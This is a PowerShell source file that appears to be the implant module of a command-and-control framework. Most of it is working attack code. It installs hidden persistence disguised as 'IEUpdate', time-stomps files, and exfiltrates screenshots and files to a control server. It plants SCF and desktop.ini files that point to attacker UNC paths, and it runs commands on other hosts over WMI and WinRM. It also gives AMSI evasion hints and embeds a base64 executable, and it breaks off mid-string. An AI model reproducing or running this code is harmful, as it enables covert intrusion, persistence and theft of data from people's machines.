function Test-Wow64() {
    return (Test-Win32) -and ( test-path env:\PROCESSOR_ARCHITEW6432)
}
function Test-Win64() {
    return [IntPtr]::size -eq 8
}
function Test-Win32() {
    return [IntPtr]::size -eq 4
}

Function Turtle($sleeptime) {
    if ($sleeptime.ToLower().Contains('m')) {
        $sleeptime = $sleeptime -replace 'm', ''
        [int]$newsleep = $sleeptime
        [int]$newsleep = $newsleep * 60
    }
    elseif ($sleeptime.ToLower().Contains('h')) {
        $sleeptime = $sleeptime -replace 'h', ''
        [int]$newsleep1 = $sleeptime
        [int]$newsleep2 = $newsleep1 * 60
        [int]$newsleep = $newsleep2 * 60
    }
    elseif ($sleeptime.ToLower().Contains('s')) {
        $newsleep = $sleeptime -replace 's', ''
    } else {
        $newsleep = $sleeptime
    }
    Start-Sleep $newsleep
}
Function CheckArchitecture
{
    if (Test-Win64) {
        Write-Output "64bit implant running on 64bit machine"
    }
    elseif ((Test-Win32) -and (-Not (Test-Wow64))) {
        Write-Output "32bit running on 32bit machine"
    }
    elseif ((Test-Win32) -and (Test-Wow64)) {
        $global:ImpUpgrade = $True
        Write-Output "32bit implant running on a 64bit machine, use StartAnotherImplant to upgrade to 64bit"
    }
    else {
        Write-Output "Unknown Architecture Detected"
    }
    get-process -id $pid -module |%{ if ($_.modulename -eq "amsi.dll") {echo "`n[+] AMSI Detected. Migrate to avoid the Anti-Malware Scan Interface (AMSI)"} }
}
Function Get-Proxy {
    Get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
}
Function CheckVersionTwo
{
    $psver = $PSVersionTable.psversion.Major
    if ($psver -ne '2') {
        Write-Output "`n[+] Powershell version $psver detected. Run Inject-Shellcode with the v2 Shellcode"
        Write-Output "[+] Warning AMSI, Constrained Mode, ScriptBlock/Module Logging could be enabled"
    }
}
$global:ImpUpgrade = $False
CheckArchitecture
CheckVersionTwo
Function StartAnotherImplant {
    if (($p = Get-Process | ? {$_.id -eq $pid}).name -ne "powershell") {
        echo "Process is not powershell, try running migrate -x86 or migrate -x64"
    } else {
        if ($global:ImpUpgrade) {
            echo "Start-Process Upgrade via CMD"
            start-process -windowstyle hidden cmd -args "/c `"$env:windir\sysnative\windowspowershell\v1.0\$payload`""
        } else {
            echo "Start-Process via CMD"
            start-process -windowstyle hidden cmd -args "/c $payload"
        }
    }
}
sal S StartAnotherImplant
sal SAI StartAnotherImplant
sal invoke-smblogin invoke-smbexec
Function Invoke-DowngradeAttack
{
    $payload = $payload -replace "-exec", "-v 2 -exec"
    StartAnotherImplant
}
function Test-Administrator
{
    $user = [Security.Principal.WindowsIdentity]::GetCurrent();
    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}
function Check-Command($cmdname)
{
    return [bool](Get-Command -Name $cmdname -ErrorAction SilentlyContinue)
    $error.clear()
}
function Create-Shortcut($SourceExe, $ArgumentsToSourceExe, $DestinationPath)
{
    $WshShell = New-Object -comObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($DestinationPath)
    $Shortcut.TargetPath = $SourceExe
    $Shortcut.Arguments = $ArgumentsToSourceExe
    $Shortcut.WindowStyle = 7
    $Shortcut.Save()
    echo "[+] Shortcut created: $DestinationPath"
}
function EnableRDP
{
    if (Test-Administrator) {
        set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
        set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
        $psver = $PSVersionTable.psversion.Major
        if ($psver -ne '2')
        {
            Get-NetFirewallRule -DisplayName "Remote Desktop*" | Set-NetFirewallRule -enabled true
        } else {
            netsh advfirewall firewall add rule name="Remote Desktop" dir=in action=allow protocol=TCP localport=3389
        }
    } else {
    Write-Output "You are not elevated to Administator "
    }
}
function DisableRDP
{
    if (Test-Administrator) {
        set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 1
        set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0
        $psver = $PSVersionTable.psversion.Major
        if ($psver -ne '2')
        {
            Get-NetFirewallRule -DisplayName "Remote Desktop*" | Set-NetFirewallRule -enabled false
        } else {
            netsh advfirewall firewall del rule name="Remote Desktop" dir=in action=allow protocol=TCP localport=3389
        }
    } else {
    Write-Output "You are not elevated to Administator "
    }
}
function Write-SCFFile
{
    Param ($IPaddress, $Location)
    "[Shell]" >$Location\~T0P0092.jpg.scf
    "Command=2" >> $Location\~T0P0092.jpg.scf;
    "IconFile=\\$IPaddress\remote.ico" >> $Location\~T0P0092.jpg.scf;
    "[Taskbar]" >> $Location\~T0P0092.jpg.scf;
    "Command=ToggleDesktop" >> $Location\~T0P0092.jpg.scf;
    Write-Output "Written SCF File: $Location\~T0P0092.jpg.scf"
}
function Write-INIFile
{
    Param ($IPaddress, $Location)
    "[.ShellClassInfo]" > $Location\desktop.ini
    "IconResource=\\$IPAddress\resource.dll" >> $Location\desktop.ini
    $a = Get-item $Location\desktop.ini -Force; $a.Attributes="Hidden"
    Write-Output "Written INI File: $Location\desktop.ini"
}
Function Install-Persistence
{
    Param ($Method)
    if (!$Method){$Method=1}
    if ($Method -eq 1) {
        Set-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper777 -value "$payload"
        Set-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\run\" IEUpdate -value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -Noninteractive -windowstyle hidden -c iex (Get-ItemProperty -Path Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\).Wallpaper777"
        $registrykey = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\run\" IEUpdate
        $registrykey2 = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper777
        if (($registrykey.IEUpdate) -and ($registrykey2.Wallpaper777)) {
        Write-Output "Successfully installed persistence: `n Regkey: HKCU\Software\Microsoft\Windows\currentversion\run\IEUpdate `n Regkey2: HKCU\Software\Microsoft\Windows\currentversion\themes\Wallpaper777"
        } else {
        Write-Output "Error installing persistence"
        }
    }
    if ($Method -eq 2) {
        Set-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper555 -value "$payload"
        $registrykey = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper555
        schtasks.exe /create /sc minute /mo 240 /tn "IEUpdate" /tr "powershell -exec bypass -Noninteractive -windowstyle hidden -c iex (Get-ItemProperty -Path Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\).Wallpaper555"
        If ($registrykey.Wallpaper555) {
            Write-Output "Created scheduled task persistence every 4 hours"
        }
    }
    if ($Method -eq 3) {
        Set-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper666 -value "$payload"
        $registrykey2 = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper666
        $SourceExe = "powershell.exe"
        $ArgumentsToSourceExe = "-exec bypass -Noninteractive -windowstyle hidden -c iex (Get-ItemProperty -Path Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\).Wallpaper666"
        $DestinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\IEUpdate.lnk"
        $WshShell = New-Object -comObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut($DestinationPath)
        $Shortcut.TargetPath = $SourceExe
        $Shortcut.Arguments = $ArgumentsToSourceExe
        $Shortcut.WindowStyle = 7
        $Shortcut.Save()
        If ((Test-Path $DestinationPath) -and ($registrykey2.Wallpaper666)) {
            Write-Output "Created StartUp folder persistence and added RegKey`n Regkey: HKCU\Software\Microsoft\Windows\currentversion\themes\Wallpaper666"
            Write-Output " LNK File: $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\IEUpdate.lnk"
        } else {
            Write-Output "Error installing StartUp folder persistence"
        }
    }
}
Function InstallExe-Persistence() {
        if (Test-Path "$env:Temp\Winlogon.exe") {
            $SourceEXE = "rundll32.exe"
            $ArgumentsToSourceExe = "shell32.dll,ShellExec_RunDLL %temp%\winlogon.exe"
            $DestinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinLogon.lnk"
            $WshShell = New-Object -comObject WScript.Shell
            $Shortcut = $WshShell.CreateShortcut($DestinationPath)
            $Shortcut.TargetPath = $SourceEXE
            $Shortcut.Arguments = $ArgumentsToSourceExe
            $Shortcut.WindowStyle = 7
            $Shortcut.Save()
            TimeStomp $DestinationPath "01/03/2008 12:12 pm"
            TimeStomp "$env:Temp\Winlogon.exe" "01/03/2008 12:12 pm"
            If ((Test-Path $DestinationPath) -and (Test-Path "$env:Temp\Winlogon.exe")) {
                Write-Output "Created StartUp file Exe persistence: $DestinationPath"
            } else {
                Write-Output "Error installing StartUp Exe persistence"
                Write-Output "Upload EXE to $env:Temp\Winlogon.exe"
            }
        } else {
            Write-Output "Error installing StartUp Exe persistence"
            Write-Output "Upload EXE to $env:Temp\Winlogon.exe"
        }
}
Function RemoveExe-Persistence() {
        $DestinationPath1 = "$env:Temp\winlogon.exe"
        If (Test-Path $DestinationPath1) {
            Remove-Item -Force $DestinationPath1
        }

        $DestinationPath2 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinLogon.lnk"
        If (Test-Path $DestinationPath2) {
            Remove-Item -Force $DestinationPath2
        }

        If ((Test-Path $DestinationPath1) -or ((Test-Path $DestinationPath2))) {
            Write-Output "Unable to Remove Persistence"
        } else {
            Write-Output "Persistence Removed"
        }
}
Function Remove-Persistence
{
    Param ($Method)
    if (!$Method){$Method=1}
    if ($Method -eq 1) {
        Remove-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper777
        Remove-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\run\" IEUpdate
        $registrykey = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\run\" IEUpdate
        $registrykey2 = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper777
        if (($registrykey -eq $null) -and ($registrykey2 -eq $null)) {
        Write-Output "Successfully removed persistence from registry!"
        $error.clear()
        } else {
        Write-Output "Error removing persistence, remove registry keys manually!"
        $error.clear()
    }
    if ($Method -eq 2) {
        schtasks.exe /delete /tn IEUpdate /F
        Remove-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper555
        $registrykey = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper555
        if ($registrykey -eq $null) {
            Write-Output "Successfully removed persistence from registry!"
            Write-Output "Removed scheduled task persistence"
        }else {
            Write-Output "Error removing SchTasks persistence"
        }
    }
    if ($Method -eq 3) {
        Remove-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper666
        $registrykey = get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\currentversion\themes\" Wallpaper666
        Remove-Item "$env:APPDATA\Microsoft\Windows\StartMenu\Programs\Startup\IEUpdate.lnk"
        If ((Test-Path $DestinationPath) -and ($registrykey.Wallpaper666)) {
            Write-Output "Removed StartUp folder persistence"
        }else {
            Write-Output "Error installing StartUp folder persistence"
        }
    }
}
}
Function Web-Upload-File
{
    Param
    (
        [string]
        $From,
        [string]
        $To
    )
    (Get-Webclient).DownloadFile($From,$To)
}
function Unzip($file, $destination)
{
	$shell = new-object -com shell.application
	$zip = $shell.NameSpace($file)
	foreach($item in $zip.items())
	{
		$shell.Namespace($destination).copyhere($item)
	}
}
function ConvertFrom-Base64
{
    param
    (
        [string] $SourceFilePath,
        [string] $TargetFilePath
    )

    $SourceFilePath = Resolve-PathSafe $SourceFilePath
    $TargetFilePath = Resolve-PathSafe $TargetFilePath

    $bufferSize = 90000
    $buffer = New-Object char[] $bufferSize

    $reader = [System.IO.File]::OpenText($SourceFilePath)
    $writer = [System.IO.File]::OpenWrite($TargetFilePath)

    $bytesRead = 0
    do
    {
        $bytesRead = $reader.Read($buffer, 0, $bufferSize);
        $bytes = [Convert]::FromBase64CharArray($buffer, 0, $bytesRead);
        $writer.Write($bytes, 0, $bytes.Length);
    } while ($bytesRead -eq $bufferSize);

    $reader.Dispose()
    $writer.Dispose()
}
Function Test-ADCredential
{
	Param($username, $password, $domain)
	Add-Type -AssemblyName System.DirectoryServices.AccountManagement
	$ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain
	$pc = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($ct, $domain)
	$object = New-Object PSObject | Select Username, Password, IsValid
	$object.Username = $username;
	$object.Password = $password;
	$object.IsValid = $pc.ValidateCredentials($username, $password).ToString();
	return $object
}
Function Get-ScreenshotMulti {
    param($Timedelay, $Quantity, [string] $TaskId)

    if ($Quantity -and $Timedelay) {
        ForEach ($number in 1..[int]$Quantity ) {
            try { $Output = Get-Screenshot } catch { $Output = $null }
            try {
            $Output = Encrypt-String2 $key $Output
            $UploadBytes = getimgdata $Output
            $eid = Encrypt-String $key $TaskId
            (Get-Webclient -Cookie $eid).UploadData("$Server", $UploadBytes)|out-null

            } catch {}
            Start-Sleep $Timedelay
        }
    }
}
Function Get-Screenshot
{
    param($File)

    #import libraries
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing

    # Gather Screen resolution information
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top

    # Create bitmap using the top-left and bottom-right bounds
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height

    # Create Graphics object
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)

    # Capture screen
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)

    # Send back as base64
    $msimage = New-Object IO.MemoryStream

    if ($File) {
        $bitmap.save($file, "png")
    } else {
        $bitmap.save($msimage, "png")
        $b64 = [Convert]::ToBase64String($msimage.toarray())
    }
    return $b64
}
$psloadedscreen = $null
function Download-Files
{
    param
    (
        [string] $Directory, [string] $TaskId
    )
    $files = Get-ChildItem $Directory -Recurse | Where-Object{!($_.PSIsContainer)}
    foreach ($item in $files)
    {
        Download-File -Source $item.FullName -TaskId $TaskId
    }
}
function Get-RandomName
{
    param
    (
        [int]$Length
    )
    $set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
    $result = ''
    for ($x = 0; $x -lt $Length; $x++)
    {$result += $set | Get-Random}
    return $result
}
function Download-File
{
    param
    (
        [string] $Source,
        [string] $TaskId
    )
    try {
         $fileName = Resolve-PathSafe $Source
        $randomName = Get-RandomName -Length 5
        $fileExt = [System.IO.Path]::GetExtension($fileName)
        $fileNameOnly = [System.IO.Path]::GetFileNameWithoutExtension($fileName)
        $fullNewname = $Source
        $bufferSize = 10737418;
        $fs = [System.IO.File]::OpenRead($fileName);
        $fileSize =(Get-Item $fileName).Length
        $chunkSize = $fileSize / $bufferSize
        $totalChunks = [int][Math]::Ceiling($chunkSize)
        if ($totalChunks -lt 1) {$totalChunks = 1}
        $totalChunkStr = $totalChunks.ToString("00000")
        $totalChunkByte = [System.Text.Encoding]::UTF8.GetBytes($totalChunkStr)
        $Chunk = 1
        $finfo = new-object System.IO.FileInfo ($fileName)
        $size = $finfo.Length
        $str = New-Object System.IO.MemoryStream;
        $buffer = New-Object byte[] $bufferSize;
        do {
            $read = $fs.Read($buffer, 0, $buffer.Length);
            if ($read -lt 0 -or $read -eq 0) {write-output "BREAK"}
            $str.Write($buffer, 0, $read);
            $ChunkStr = $Chunk.ToString("00000")
            $ChunkedByte = [System.Text.Encoding]::UTF8.GetBytes($ChunkStr)
            $preNumbers = New-Object byte[] 10
            $preNumbers = ($ChunkedByte+$totalChunkByte)
            $eid = Encrypt-String $key $TaskId
            $send = Encrypt-Bytes $key ($preNumbers+$str.ToArray())
            $UploadBytes = getimgdata $send
            (Get-Webclient -Cookie $eid).UploadData("$Server", $UploadBytes)|out-null
            $str.SetLength(0);
            ++$Chunk
        } until (($size -= $bufferSize) -le 0);
    } catch {
        $Output = "ErrorDownload: " + $error[0]
        $eid = Encrypt-String $key $TaskId
        $send = Encrypt-String2 $key $output
        $UploadBytes = getimgdata $send
        (Get-Webclient -Cookie $eid).UploadData("$Server", $UploadBytes)|out-null
    } finally {
        $fs.Close()
    }
}
function Posh-Delete
{
    param
    (
        [string] $Destination
    )
    try {
    $file = Get-Item $Destination -Force
    $file.Attributes = "Normal"
    $content = New-Object Byte[] $file.length
    (New-Object Random).NextBytes($content)
    [IO.File]::WriteAllBytes($file,$content)
    Remove-Item $Destination -Force
    } catch {
    echo $error[0]
    }
}
function Upload-File
{
    param
    (
        [string] $Base64,
        [string] $Destination,
        [bool] $NotHidden = $false
    )
    try {
        $Stream = ""
        $FullPath = $Destination
        if ($Destination -Match ':[^\\]'){
            $Destination =  $FullPath.Substring(0, $FullPath.LastIndexOf(":"))
            $Stream = $FullPath.Substring($FullPath.LastIndexOf(":") + 1)
        }
        if($Stream){
            $NotHidden = $true
        }
        if ($NotHidden -eq $true) {
            $fileBytes = [Convert]::FromBase64String($Base64)
            if ($Stream){
                set-content -path $Destination -value $fileBytes -stream $Stream -encoding byte
            } else {
                [io.file]::WriteAllBytes($Destination, $fileBytes)
            }
            write-output "Uploaded file to: $FullPath"
        } else {
            $fileBytes = [Convert]::FromBase64String($Base64)
            [io.file]::WriteAllBytes($Destination, $fileBytes)
            write-output "Uploaded file as HIDDEN & SYSTEM to: $FullPath"
            $file = Get-Item $Destination -Force
            $attrib = $file.Attributes
            $attrib = "Hidden,System"
            $file.Attributes = $attrib
            write-output "Run Get-ChildItem -Force to view the uploaded files"
        }

    } catch {

        echo $error[0]

    }
}
Function UnHideFile ($file) {
    $f = Get-Item "$file" -Force
    $a = $f.Attributes
    $a = "Normal"
    $f.Attributes = $a
}
Function HideFile ($file) {
    $f = Get-Item "$file" -Force
    $a = $f.Attributes
    $a = "Hidden,System"
    $f.Attributes = $a
}
function Resolve-PathSafe
{
    param
    (
        [string] $Path
    )

    $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($Path)
}
function EnableWinRM {
Param
(
[string]
$username,
[string]
$password,
[string]
$computer
)
Invoke-command -computer localhost -credential $getcreds -scriptblock { set-itemproperty -path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Value 1 -Type Dword}
Invoke-Command -Computer localhost -Credential $getcreds -Scriptblock {Set-Item WSMan:localhost\client\trustedhosts -value * -force}
$command = "cmd /c powershell.exe -c Set-WSManQuickConfig -Force;Set-Item WSMan:\localhost\Service\Auth\Basic -Value $True;Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $True; Register-PSSessionConfiguration -Name Microsoft.PowerShell -Force"
$PSS = ConvertTo-SecureString $password -AsPlainText -Force
$getcreds = new-object system.management.automation.PSCredential $username,$PSS
Invoke-WmiMethod -Path Win32_process -Name create -ComputerName $computer -Credential $getcreds -ArgumentList $command
}

function DisableWinRM {
Param
(
[string]
$username,
[string]
$password,
[string]
$computer
)
$command = "cmd /c powershell.exe -c Set-Item WSMan:\localhost\Service\Auth\Basic -Value $False;Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $False;winrm delete winrm/config/listener?address=*+transport=HTTP;Stop-Service -force winrm;Set-Service -Name winrm -StartupType Disabled"
$PSS = ConvertTo-SecureString $password -AsPlainText -Force
$getcreds = new-object system.management.automation.PSCredential $username,$PSS
Invoke-WmiMethod -Path Win32_process -Name create -ComputerName $computer -Credential $getcreds -ArgumentList $command
}
function WMICommand {
Param
(
[string]
$username,
[string]
$password,
[string]
$computer,
[string]
$command
)
$PSS = ConvertTo-SecureString $password -AsPlainText -Force
$getcreds = new-object system.management.automation.PSCredential $username,$PSS
$WMIResult = Invoke-WmiMethod -Path Win32_process -Name create -ComputerName $computer -Credential $getcreds -ArgumentList $command
If ($WMIResult.Returnvalue -eq 0) {
    Write-Output "Executed WMI Command with Sucess: $Command `n"
} else {
    Write-Output "WMI Command Failed - Could be due to permissions or UAC is enabled on the remote host, Try mounting the C$ share to check administrative access to the host"
}
}

Function Get-ProcessFull {

[System.Diagnostics.Process[]] $processes64bit = @()
[System.Diagnostics.Process[]] $processes32bit = @()

$owners = @{}
$fp = gwmi win32_process;

ForEach ($r in $fp) {
    try {
        $owners[$r.handle] = $r.getowner().user
    } catch {}
}

$AllProcesses = @()

    if (Test-Win64) {
        Write-Output "64bit implant running on 64bit machine"
    }

if (Test-Win64) {
    foreach($process in get-process) {
    $modules = $process.modules
    foreach($module in $modules) {
        $file = [System.IO.Path]::GetFileName($module.FileName).ToLower()
        if($file -eq "wow64.dll") {
            $processes32bit += $process
            $pobject = New-Object PSObject | Select ID, StartTime, Name, Path, Arch, Username
            $pobject.Id = $process.Id
            $pobject.StartTime = $process.StartTime
            $pobject.Name = $process.Name
			$pobject.Path = $process.Path
            $pobject.Arch = "x86"
            $pobject.UserName = $owners[$process.Id.tostring()]
            $AllProcesses += $pobject
            break
        }
    }

    if(!($processes32bit -contains $process)) {
        $processes64bit += $process
        $pobject = New-Object PSObject | Select ID, StartTime, Name, Path, Arch, UserName
        $pobject.Id = $process.Id
        $pobject.StartTime = $process.StartTime
        $pobject.Name = $process.Name
		$pobject.Path = $process.Path
        $pobject.Arch = "x64"
        $pobject.UserName = $owners[$process.Id.tostring()]
        $AllProcesses += $pobject
    }
}
}
elseif ((Test-Win32) -and (-Not (Test-Wow64))) {
foreach($process in get-process) {
    $processes32bit += $process
    $pobject = New-Object PSObject | Select ID, StartTime, Name, Path, Arch, Username
    $pobject.Id = $process.Id
    $pobject.StartTime = $process.StartTime
    $pobject.Name = $process.Name
	$pobject.Path = $process.Path
    $pobject.Arch = "x86"
    $pobject.UserName = $owners[$process.Id.tostring()]
    $AllProcesses += $pobject
}
}
elseif ((Test-Win32) -and (Test-Wow64)) {
    foreach($process in get-process) {
    $modules = $process.modules
    foreach($module in $modules) {
        $file = [System.IO.Path]::GetFileName($module.FileName).ToLower()
        if($file -eq "wow64.dll") {
            $processes32bit += $process
            $pobject = New-Object PSObject | Select ID, StartTime, Name, Path, Arch, Username
            $pobject.Id = $process.Id
            $pobject.StartTime = $process.StartTime
            $pobject.Name = $process.Name
			$pobject.Path = $process.Path
            $pobject.Arch = "x86"
            $pobject.UserName = $owners[$process.Id.tostring()]
            $AllProcesses += $pobject
            break
        }
    }

    if(!($processes32bit -contains $process)) {
        $processes64bit += $process
        $pobject = New-Object PSObject | Select ID, StartTime, Name, Path, Arch, UserName
        $pobject.Id = $process.Id
        $pobject.StartTime = $process.starttime
        $pobject.Name = $process.Name
		$pobject.Path = $process.Path
        $pobject.Arch = "x64"
        $pobject.UserName = $owners[$process.Id.tostring()]
        $AllProcesses += $pobject
    }
}
} else {
    Write-Output "Unknown Architecture"
}

$AllProcesses|Select ID, UserName, Arch, Name, Path, StartTime | format-table -auto

}
$psloadedproclist = $null
Function Get-ProcessList() {
if ($psloadedproclist -ne "TRUE") {
    $script:psloadedproclist = "TRUE"
    $ps = "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vABWgBAAvABWgLAEvABWgCADvABWgF4EvABRgHMAwAADAMkCuQADAKoAuQADAFEAuQADAD8AJgADADIAuQADANkDuQADAF8AuQADAFYBwAADAE0EuQADEC0BwwAAAAAAgACRIMQExgABAAAAAACAAJEgAAXMAAMAAAAAAIAAkSAPBcwABQAAAAAAgACRIF4D1AAHAAAAAACAAJEg5wDcAAoAAAAAAIAAliB0BOEADABQIAAAAACWADIE6AAPAIAiAAAAAJEA8gLsAA8AqCIAAAAAkQCqA/AADwABAAEATQQBAAIAUQABAAEA3QQAAAIARwEBAAEA3QQAAAIARwEAAAEAEQEAAAIAZgQCAAMABQEAIAAAAAABAAEAnwQAIAAAAAABAAEAHwECIAIAgwQAAAEAkAQJALkDAQARALkDBgAZALkDCgApALkDEAAxALkDEAA5ALkDEABBALkDEABJALkDEABRALkDEABZALkDEABhALkDFQBpALkDEABxALkDEACZALkDBgCxAIsDJgCJALkDBgC5APMAKQDJANACMADRAKcENgDRAJgEOwCJAKMAQQCBAI0ARwCBAMoATQDZAN8CUQB5AN8CUQDhALMAWQCxAMACXgDpALkDaADpAD4BUQDRAFUEbQDRANcCcgDRAOgCNgCxACkFdwAJAAgAhgAJAAwAiwAJABAAkAAJABQAlQAJABgAmgAJABwAnwAJACAApAAJACQAqQAIACgArgAuAAsA9gAuABMA/wAuABsAHgEuACMAJwEuACsAPAEuADMAPAEuADsAPAEuAEMAJwEuAEsAQgEuAFMAPAEuAFsAPAEuAGMAWgEuAGsAhAFjAHMAhgAVALcAGQC3AB0AtwAoALMAGgBVAGIAGQAkAzEDRgEDAMQEAQBGAQUAAAUBAEYBBwAPBQEAQAEJAF4DAgBAAQsA5wABAE